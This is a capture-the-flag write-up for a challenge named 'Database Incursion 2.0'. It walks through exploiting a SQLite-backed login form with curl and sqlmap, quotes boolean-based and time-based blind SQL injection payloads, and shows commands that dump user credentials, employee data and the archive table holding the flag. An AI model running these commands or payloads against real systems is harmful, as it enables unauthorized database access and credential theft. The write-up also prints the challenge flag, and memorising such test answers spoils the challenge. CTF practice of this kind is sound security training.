# 1. DATA BASE INCURSION 2.0
Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## FLAG 
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}

## SOLUTION 
- i checked the website accessibility using ```curl -I "https://database-incursion-v2.nitephase.live/"```
- then examined the login structure using ```curl -s "https://database-incursion-v2.nitephase.live/" | grep -A 10 -B 10 "form"``` which showed me that form uses POST method with fields username and password and expects JSON responses
- then i set up sqlmap and did a basic sql injection test
  ```
  sqlmap -u "https://database-incursion-v2.nitephase.live/" \
  --method=POST \
  --data="username=test&password=test" \
  --headers="Accept: application/json" \
  --batch
  ```
- then i did an advanced detection with tamper scripts
```
sqlmap -u "https://database-incursion-v2.nitephase.live/" \
  --method=POST \
  --data="username=test&password=test" \
  --headers="Accept: application/json" \
  --tamper=space2comment,charencode \
  --ignore-code=401 \
  --level=5 \
  --risk=3 \
  --batch
```
- this showed us two vulnerabilities:
- boolean-based blind sql injection with payload: username=-9359' OR 4855=4855-- WzpX&password=test
- time-based blind sql injection with payload: username=test' OR 4347=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--tSzN&password=test
- now we know that the database used in SQLite
- now to list all the tables i used
```
sqlmap -u "https://database-incursion-v2.nitephase.live/" \
  --method=POST \
  --data="username=test&password=test" \
  --headers="Accept: application/json" \
  --tables \
  --ignore-code=401 \
  --batch
```
- this discovered all the tables in database users (contains credentials), employees, reports, metadata, CITADEL_ARCHIVE_2077, sqlite_sequence (system table)
- now to extract this data i did
```
sqlmap -u "https://database-incursion-v2.nitephase.live/" \
  --method=POST \
  --data="username=test&password=test" \
  --headers="Accept: application/json" \
  -T users \
  --dump \
  --ignore-code=401 \
  --batch
```
- so i got the user name and password
- now to extract the employee data i did
```
sqlmap -u "https://database-incursion-v2.nitephase.live/" \
  --method=POST \
  --data="username=test&password=test" \
  --headers="Accept: application/json" \
  -T employees \
  --dump \
  --ignore-code=401 \
  --batch
```
- i got the passcode using this
- now to extract the archive data
```
sqlmap -u "https://database-incursion-v2.nitephase.live/" \
  --method=POST \
  --data="username=test&password=test" \
  --headers="Accept: application/json" \
  -T CITADEL_ARCHIVE_2077 \
  --dump \
  --ignore-code=401 \
  --batch
```
- i obtained the flag



